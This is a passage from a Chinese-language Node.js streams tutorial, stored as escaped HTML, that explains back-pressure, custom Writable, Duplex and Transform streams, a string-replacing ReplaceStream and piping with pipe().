class=\"hljs-keyword\"\u003enew\u003c/span\u003e Chance();\n\n\u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e).createServer(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  res.writeHead(\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, {\n    \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'text/plain'\u003c/span\u003e\n  });\n\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egenerateMore\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{ \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (chance.bool({\n        \u003cspan class=\"hljs-attr\"\u003elikelihood\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e\n      })) {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e shouldContinue = res.write(\n        chance.string({\n          \u003cspan class=\"hljs-attr\"\u003elength\u003c/span\u003e: (\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e) - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n        }) \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n      );\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!shouldContinue) { \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Backpressure'\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e res.once(\u003cspan class=\"hljs-string\"\u003e'drain'\u003c/span\u003e, generateMore);\n      }\n    }\n    res.end(\u003cspan class=\"hljs-string\"\u003e'\\nThe end...\\n'\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'All data was sent'\u003c/span\u003e));\n  }\n  generateMore();\n}).listen(\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Listening on http://localhost:8080'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e前面代码中最重要的步骤可以概括如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们将主逻辑封装在一个名为\u003ccode\u003egenerateMore()\u003c/code\u003e的函数中。\u003c/li\u003e\n\u003cli\u003e为了增加获得一些\u003ccode\u003eback-pressure\u003c/code\u003e的机会，我们将数据块的大小增加到\u003ccode\u003e16KB-1Byte\u003c/code\u003e，这非常接近默认的\u003ccode\u003ehighWaterMark\u003c/code\u003e限制。\u003c/li\u003e\n\u003cli\u003e在写入一大块数据之后，我们检查\u003ccode\u003eres.write()\u003c/code\u003e的返回值。 如果它返回\u003ccode\u003efalse\u003c/code\u003e，这意味着内部\u003ccode\u003ebuffer\u003c/code\u003e已满，我们应该停止发送更多的数据。在这种情况下，我们从函数中退出，然后新注册一个写入事件的发布者，当\u003ccode\u003edrain\u003c/code\u003e事件触发时调用\u003ccode\u003egenerateMore\u003c/code\u003e。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e如果我们现在尝试再次运行服务器，然后使用\u003ccode\u003ecurl\u003c/code\u003e生成客户端请求，则很可能会有一些\u003ccode\u003eback-pressure\u003c/code\u003e，因为服务器以非常高的速度生成数据，速度甚至会比底层\u003ccode\u003esocket\u003c/code\u003e更快。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e实现可写入的Streams\u003c/h4\u003e\n\u003cp\u003e我们可以通过继承\u003ccode\u003estream.Writable\u003c/code\u003e类来实现一个新的可写入的流，并为\u003ccode\u003e_write()\u003c/code\u003e方法提供一个实现。实现一个我们自定义的可写入的\u003ccode\u003eStreams\u003c/code\u003e类。\u003c/p\u003e\n\u003cp\u003e让我们构建一个可写入的\u003ccode\u003estream\u003c/code\u003e，它接收对象的格式如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n  path: \u0026lt;path to a file\u0026gt;\n  content: \u0026lt;string or buffer\u0026gt;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个类的作用是这样的：对于每一个对象，我们的\u003ccode\u003estream\u003c/code\u003e必须将\u003ccode\u003econtent\u003c/code\u003e部分保存到在给定路径中创建的文件中。 我们可以立即看到，我们\u003ccode\u003estream\u003c/code\u003e的输入是对象，而不是\u003ccode\u003eStrings\u003c/code\u003e或\u003ccode\u003eBuffers\u003c/code\u003e，这意味着我们的\u003ccode\u003estream\u003c/code\u003e必须以对象模式工作。\u003c/p\u003e\n\u003cp\u003e调用模块\u003ccode\u003etoFileStream.js\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'stream'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e mkdirp = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'mkdirp'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eToFileStream\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estream\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003eWritable\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e() {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e({\n      \u003cspan class=\"hljs-attr\"\u003eobjectMode\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    });\n  }\n\n  _write(chunk, encoding, callback) {\n    mkdirp(path.dirname(chunk.path), err =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e callback(err);\n      }\n      fs.writeFile(chunk.path, chunk.content, callback);\n    });\n  }\n}\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = ToFileStream;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e作为第一步，我们加载所有我们所需要的依赖包。注意，我们需要模块\u003ccode\u003emkdirp\u003c/code\u003e，正如你应该从前几章中所知道的，它应该使用\u003ccode\u003enpm\u003c/code\u003e安装。\u003c/p\u003e\n\u003cp\u003e我们创建了一个新类，它从\u003ccode\u003estream.Writable\u003c/code\u003e扩展而来。\u003c/p\u003e\n\u003cp\u003e我们不得不调用父构造函数来初始化其内部状态；我们还提供了一个\u003ccode\u003eoption\u003c/code\u003e对象作为参数，用于指定流在对象模式下工作（\u003ccode\u003eobjectMode：true\u003c/code\u003e）。\u003ccode\u003estream.Writable\u003c/code\u003e接受的其他选项如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehighWaterMark\u003c/code\u003e（默认值是\u003ccode\u003e16KB\u003c/code\u003e）：控制\u003ccode\u003eback-pressure\u003c/code\u003e的上限。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edecodeStrings\u003c/code\u003e（默认为\u003ccode\u003etrue\u003c/code\u003e）：在字符串传递给\u003ccode\u003e_write()\u003c/code\u003e方法之前，将字符串自动解码为二进制\u003ccode\u003ebuffer\u003c/code\u003e区。 在对象模式下这个参数被忽略。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e最后，我们为\u003ccode\u003e_write()\u003c/code\u003e方法提供了一个实现。正如你所看到的，这个方法接受一个数据块，一个编码方式（只有在二进制模式下，\u003ccode\u003estream\u003c/code\u003e选项\u003ccode\u003edecodeStrings\u003c/code\u003e设置为\u003ccode\u003efalse\u003c/code\u003e时才有意义）。\u003c/p\u003e\n\u003cp\u003e另外，该方法接受一个回调函数，该函数在操作完成时需要调用；而不必要传递操作的结果，但是如果需要的话，我们仍然可以传递一个\u003ccode\u003eerror\u003c/code\u003e对象，这将导致\u003ccode\u003estream\u003c/code\u003e触发\u003ccode\u003eerror\u003c/code\u003e事件。\u003c/p\u003e\n\u003cp\u003e现在，为了尝试我们刚刚构建的\u003ccode\u003estream\u003c/code\u003e，我们可以创建一个名为\u003ccode\u003ewriteToFile.js\u003c/code\u003e的新模块，并对该流执行一些写操作：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ToFileStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./toFileStream.js'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e tfs = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ToFileStream();\n\ntfs.write({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"file1.txt\"\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Hello\"\u003c/span\u003e});\ntfs.write({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"file2.txt\"\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Node.js\"\u003c/span\u003e});\ntfs.write({\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"file3.txt\"\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Streams\"\u003c/span\u003e});\ntfs.end(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"All files created\"\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有了这个，我们创建并使用了我们的第一个自定义的可写入流。 像往常一样运行新模块来检查其输出；你会看到执行后会创建三个新文件。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e双重的Streams\u003c/h3\u003e\n\u003cp\u003e双重的\u003ccode\u003estream\u003c/code\u003e既是可读的，也可写的。 当我们想描述一个既是数据源又是数据终点的实体时（例如\u003ccode\u003esocket\u003c/code\u003e），这就显得十分有用了。 双工流继承\u003ccode\u003estream.Readable\u003c/code\u003e和\u003ccode\u003estream.Writable\u003c/code\u003e的方法，所以它对我们来说并不新鲜。这意味着我们可以\u003ccode\u003eread()\u003c/code\u003e或\u003ccode\u003ewrite()\u003c/code\u003e数据，或者可以监听\u003ccode\u003ereadable\u003c/code\u003e和\u003ccode\u003edrain\u003c/code\u003e事件。\u003c/p\u003e\n\u003cp\u003e要创建一个自定义的双重\u003ccode\u003estream\u003c/code\u003e，我们必须为\u003ccode\u003e_read()\u003c/code\u003e和\u003ccode\u003e_write()\u003c/code\u003e提供一个实现。传递给\u003ccode\u003eDuplex()\u003c/code\u003e构造函数的\u003ccode\u003eoptions\u003c/code\u003e对象在内部被转发给\u003ccode\u003eReadable\u003c/code\u003e和\u003ccode\u003eWritable\u003c/code\u003e的构造函数。\u003ccode\u003eoptions\u003c/code\u003e参数的内容与前面讨论的相同，\u003ccode\u003eoptions\u003c/code\u003e增加了一个名为\u003ccode\u003eallowHalfOpen\u003c/code\u003e值（默认为\u003ccode\u003etrue\u003c/code\u003e），如果设置为\u003ccode\u003efalse\u003c/code\u003e，则会导致只要\u003ccode\u003estream\u003c/code\u003e的一方（\u003ccode\u003eReadable\u003c/code\u003e和\u003ccode\u003eWritable\u003c/code\u003e）结束，\u003ccode\u003estream\u003c/code\u003e就结束了。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e为了使双重的stream在一方以对象模式工作，而在另一方以二进制模式工作，我们需要在流构造器中手动设置以下属性：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._writableState.objectMode\n\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._readableState.objectMode\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e转换的Streams\u003c/h3\u003e\n\u003cp\u003e转换的\u003ccode\u003eStreams\u003c/code\u003e是专门设计用于处理数据转换的一种特殊类型的双重\u003ccode\u003eStreams\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e在一个简单的双重\u003ccode\u003eStreams\u003c/code\u003e中，从\u003ccode\u003estream\u003c/code\u003e中读取的数据和写入到其中的数据之间没有直接的关系（至少\u003ccode\u003estream\u003c/code\u003e是不可知的）。 想想一个\u003ccode\u003eTCP socket\u003c/code\u003e，它只是向远程节点发送数据和从远程节点接收数据。\u003ccode\u003eTCP socket\u003c/code\u003e自身没有意识到输入和输出之间有任何关系。\u003c/p\u003e\n\u003cp\u003e下图说明了双重\u003ccode\u003eStreams\u003c/code\u003e中的数据流：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ebb1158b0?w=810\u0026amp;h=350\u0026amp;f=png\u0026amp;s=42295\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e另一方面，转换的\u003ccode\u003eStreams\u003c/code\u003e对从可写入端接收到的每个数据块应用某种转换，然后在其可读端使转换的数据可用。\u003c/p\u003e\n\u003cp\u003e下图显示了数据如何在转换的\u003ccode\u003eStreams\u003c/code\u003e中流动：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8ef108f983?w=846\u0026amp;h=348\u0026amp;f=png\u0026amp;s=53242\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从外面看，转换的\u003ccode\u003eStreams\u003c/code\u003e的接口与双重\u003ccode\u003eStreams\u003c/code\u003e的接口完全相同。但是，当我们想要构建一个新的双重\u003ccode\u003eStreams\u003c/code\u003e时，我们必须提供\u003ccode\u003e_read()\u003c/code\u003e和\u003ccode\u003e_write()\u003c/code\u003e方法，而为了实现一个新的变换流，我们必须填写另一对方法：\u003ccode\u003e_transform()\u003c/code\u003e和\u003ccode\u003e_flush()\u003c/code\u003e）。\u003c/p\u003e\n\u003cp\u003e我们来演示如何用一个例子来创建一个新的转换的\u003ccode\u003eStreams\u003c/code\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e实现转换的Streams\u003c/h4\u003e\n\u003cp\u003e我们来实现一个转换的\u003ccode\u003eStreams\u003c/code\u003e，它将替换给定所有出现的字符串。 要做到这一点，我们必须创建一个名为\u003ccode\u003ereplaceStream.js\u003c/code\u003e的新模块。 让我们直接看怎么实现它：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'stream'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e util = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'util'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eReplaceStream\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estream\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003eTransform\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(searchString, replaceString) {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e();\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.searchString = searchString;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.replaceString = replaceString;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.tailPiece = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  }\n\n  _transform(chunk, encoding, callback) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e pieces = (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.tailPiece + chunk)         \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n      .split(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.searchString);\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e lastPiece = pieces[pieces.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e tailPieceLen = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.searchString.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.tailPiece = lastPiece.slice(-tailPieceLen);     \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n    pieces[pieces.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e] = lastPiece.slice(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,-tailPieceLen);\n\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push(pieces.join(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.replaceString));       \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n    callback();\n  }\n\n  _flush(callback) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.tailPiece);\n    callback();\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = ReplaceStream;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e与往常一样，我们将从其依赖项开始构建模块。这次我们没有使用第三方模块。\u003c/p\u003e\n\u003cp\u003e然后我们创建了一个从\u003ccode\u003estream.Transform\u003c/code\u003e基类继承的新类。该类的构造函数接受两个参数：\u003ccode\u003esearchString\u003c/code\u003e和\u003ccode\u003ereplaceString\u003c/code\u003e。 正如你所想象的那样，它们允许我们定义要匹配的文本以及用作替换的字符串。 我们还初始化一个将由\u003ccode\u003e_transform()\u003c/code\u003e方法使用的\u003ccode\u003etailPiece\u003c/code\u003e内部变量。\u003c/p\u003e\n\u003cp\u003e现在，我们来分析一下\u003ccode\u003e_transform()\u003c/code\u003e方法，它是我们新类的核心。\u003ccode\u003e_transform()\u003c/code\u003e方法与可写入的\u003ccode\u003estream\u003c/code\u003e的\u003ccode\u003e_write()\u003c/code\u003e方法具有几乎相同的格式，但不是将数据写入底层资源，而是使用\u003ccode\u003ethis.push()\u003c/code\u003e将其推入内部\u003ccode\u003ebuffer\u003c/code\u003e，这与我们会在可读流的\u003ccode\u003e_read()\u003c/code\u003e方法中执行。这显示了转换的\u003ccode\u003eStreams\u003c/code\u003e的双方如何实际连接。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eReplaceStream\u003c/code\u003e的\u003ccode\u003e_transform()\u003c/code\u003e方法实现了我们这个新类的核心。正常情况下，搜索和替换\u003ccode\u003ebuffer\u003c/code\u003e区中的字符串是一件容易的事情；但是，当数据流式传输时，情况则完全不同，可能的匹配可能分布在多个数据块中。代码后面的程序可以解释如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们的算法使用\u003ccode\u003esearchString\u003c/code\u003e函数作为分隔符来分割块。\u003c/li\u003e\n\u003cli\u003e然后，它取出分隔后生成的数组的最后一项\u003ccode\u003elastPiece\u003c/code\u003e，并提取其最后一个字符\u003ccode\u003esearchString.length - 1\u003c/code\u003e。结果被保存到\u003ccode\u003etailPiece\u003c/code\u003e变量中，它将会被作为下一个数据块的前缀。\u003c/li\u003e\n\u003cli\u003e最后，所有从\u003ccode\u003esplit()\u003c/code\u003e得到的片段用\u003ccode\u003ereplaceString\u003c/code\u003e作为分隔符连接在一起，并推入内部\u003ccode\u003ebuffer\u003c/code\u003e区。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e当\u003ccode\u003estream\u003c/code\u003e结束时，我们可能仍然有最后一个\u003ccode\u003etailPiece\u003c/code\u003e变量没有被压入内部缓冲区。这正是\u003ccode\u003e_flush()\u003c/code\u003e方法的用途；它在\u003ccode\u003estream\u003c/code\u003e结束之前被调用，并且这是我们最终有机会完成流或者在完全结束流之前推送任何剩余数据的地方。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_flush()\u003c/code\u003e方法只需要一个回调函数作为参数，当所有的操作完成后，我们必须确保调用这个回调函数。完成了这个，我们已经完成了我们的\u003ccode\u003eReplaceStream\u003c/code\u003e类。\u003c/p\u003e\n\u003cp\u003e现在，是时候尝试新的\u003ccode\u003estream\u003c/code\u003e。我们可以创建另一个名为\u003ccode\u003ereplaceStreamTest.js\u003c/code\u003e的模块来写入一些数据，然后读取转换的结果：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ReplaceStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./replaceStream'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e rs = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ReplaceStream(\u003cspan class=\"hljs-string\"\u003e'World'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Node.js'\u003c/span\u003e);\nrs.on(\u003cspan class=\"hljs-string\"\u003e'data'\u003c/span\u003e, chunk =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(chunk.toString()));\n\nrs.write(\u003cspan class=\"hljs-string\"\u003e'Hello W'\u003c/span\u003e);\nrs.write(\u003cspan class=\"hljs-string\"\u003e'orld!'\u003c/span\u003e);\nrs.end();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了使得这个例子更复杂一些，我们把搜索词分布在两个不同的数据块上；然后，使用\u003ccode\u003eflowing\u003c/code\u003e模式，我们从同一个\u003ccode\u003estream\u003c/code\u003e中读取数据，记录每个已转换的块。运行前面的程序应该产生以下输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eHel\nlo Node.js\n!\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e有一个值得提及是，第五种类型的stream：stream.PassThrough。 与我们介绍的其他流类不同，PassThrough不是抽象的，可以直接实例化，而不需要实现任何方法。实际上，这是一个可转换的stream，它可以输出每个数据块，而不需要进行任何转换。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e使用管道连接Streams\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eUnix\u003c/code\u003e管道的概念是由\u003ccode\u003eDouglas Mcllroy\u003c/code\u003e发明的；这使程序的输出能够连接到下一个的输入。看看下面的命令：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e Hello World! | sed s/World/Node.js/g\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在前面的命令中，\u003ccode\u003eecho\u003c/code\u003e会将\u003ccode\u003eHello World!\u003c/code\u003e写入标准输出，然后被重定向到\u003ccode\u003esed\u003c/code\u003e命令的标准输入（因为有管道操作符 \u003ccode\u003e|\u003c/code\u003e）。 然后\u003ccode\u003esed\u003c/code\u003e用\u003ccode\u003eNode.js\u003c/code\u003e替换任何\u003ccode\u003eWorld\u003c/code\u003e，并将结果打印到它的标准输出（这次是控制台）。\u003c/p\u003e\n\u003cp\u003e以类似的方式，可以使用可读的\u003ccode\u003eStreams\u003c/code\u003e的\u003ccode\u003epipe()\u003c/code\u003e方法将\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003eStreams\u003c/code\u003e连接在一起，它具有以下接口：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ereadable.pipe(writable, [options])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e非常直观地，\u003ccode\u003epipe()\u003c/code\u003e方法将从可读的\u003ccode\u003eStreams\u003c/code\u003e中发出的数据抽取到所提供的可写入的\u003ccode\u003eStreams\u003c/code\u003e中。 另外，当可读的\u003ccode\u003eStreams\u003c/code\u003e发出\u003ccode\u003eend\u003c/code\u003e事件（除非我们指定\u003ccode\u003e{end：false}\u003c/code\u003e作为\u003ccode\u003eoptions\u003c/code\u003e）时，可写入的\u003ccode\u003eStreams\u003c/code\u003e将自动结束。 \u003ccode\u003epipe()\u003c/code\u003e方法返回作为参数传递的可写入的\u003ccode\u003eStreams\u003c/code\u003e，如果这样的\u003ccode\u003estream\u003c/code\u003e也是可读的（例如双重或可转换的\u003ccode\u003eStreams\u003c/code\u003e），则允许我们创建链式调用。\u003c/p\u003e\n\u003cp\u003e将两个\u003ccode\u003eStreams\u003c/code\u003e连接到一起时，则允许数据自动流向可写入的\u003ccode\u003eStreams\u003c/code\u003e，所以不需要调用\u003ccode\u003eread()\u003c/code\u003e或\u003ccode\u003ewrite()\u003c/code\u003e方法；但最重要的是不需要控制\u003ccode\u003eback-pressure\u003c/code\u003e，因为它会自动处理。\u003c/p\u003e\n\u003cp\u003e举个简单的例子（将会有大量的例子），我们可以创建一个名为\u003ccode\u003ereplace.js\u003c/code\u003e的新模块，它接受来自标准输入的文本流，应用替换转换，然后将数据返回到标准输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ReplaceStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./replaceStream'\u003c/span\u003e);\nprocess.stdin\n  .pipe(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ReplaceStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e], process.argv[\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]))\n  .pipe(process.stdout);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上述程序将来自标准输入的数据传送到\u003ccode\u003eReplaceStream\u003c/code\u003e，然后返回到标准输出。 现在，为了实践这个小应用程序，我们可以利用\u003ccode\u003eUnix\u003c/code\u003e管道将一些数据重定向到它的标准输入，如下所示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e Hello World! | node replace World Node.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行上述程序，会输出如下结果：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eHello Node.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个简单的例子演示了\u003ccode\u003eStreams\u003c/code\u003e（特别是文本\u003ccode\u003eStreams\u003c/code\u003e）是一个通用接口，管道几乎是构成和连接所有这些接口的通用方式。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eerror\u003c/code\u003e事件不会通过管道自动传播。举个例子，看如下代码片段：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" 